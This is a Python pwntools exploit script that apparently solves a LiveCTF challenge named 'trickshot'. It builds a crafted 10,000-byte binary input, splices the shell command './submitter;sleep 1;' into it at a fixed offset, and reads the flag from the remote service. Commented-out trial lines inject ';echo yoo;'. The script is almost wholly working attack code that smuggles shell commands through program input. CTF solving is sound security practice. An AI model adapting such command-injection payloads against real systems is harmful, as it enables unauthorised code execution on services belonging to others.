#!/usr/bin/env python3

from pwn import *
#context.log_level = "debug"
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

#io = remote(HOST, int(PORT))
#io = process("../handout/challenge.py")
#io = process("./trickshot")

align = b"\x01\x00\x00\x00"

fuzz = b"\x04fUzZ\x00tHiS"
wiggle = b"\x10" + b"\x55"*7 + b"\x00\x00"
leet = b"@\x00\x00\x001337\x00\x00" 
roof = b"\x80" + b"\xff\xff\xff\xff" + b"\x01\x00\x00\x00\x01"

moves = [fuzz, wiggle, leet, roof]

def add(bs, val):
    return bytes([(x+val)&0xff for x in bs])

for j in range(5, 1000):
    for i in range(256):
        #io = process("./challenge.py")

        io = remote(HOST, int(PORT))
        inp = b"AAAA\x01\x00" + align

        for k in range(999):
            #inp += add(moves[i//250], i)
            inp += add(moves[k%4], k)


#for i in range(1000):
#    if inp[i*10] > 0x80:
#        print("ASDFSDAFSDFDA", i)

#inp += b"A"*(1000-len(inp))
        assert len(inp) == 10000

        a = bytearray(inp)
        #a[j*10:j*10+10] = add(b";echo yoo;", i)
        '''
        1536
        4096
        6656
        9216
        '''
        #idx = 0 
        #while idx != -1:
        #    idx = inp.find(bytes.fromhex("0ce0 01eb"), idx+1)
        #    print(idx)
        #exit()
        #2211 4771 7331 9891

        #2536 5096 7656
        #a[4096:4096+12] = b"./submitter;"
        a[4096:4096+20] = b"./submitter;sleep 1;"

        inp = bytes(a)
        io.sendline(inp)

        #flag = io.recvline_contains(b'LiveCTF{').decode().strip()
        flag = io.recvline_contains(b'Flag')

        #flag = io.recvline().decode().strip()


        print(flag)
        #log.info('Flag: %s', flag)
        #exit()

        #io.interactive()
        #io.recvline_contains(b"yoo")
        #print("ASDFASDFAFDSD", j, i)

        
        io.close()
        exit()
        #io.interactive()
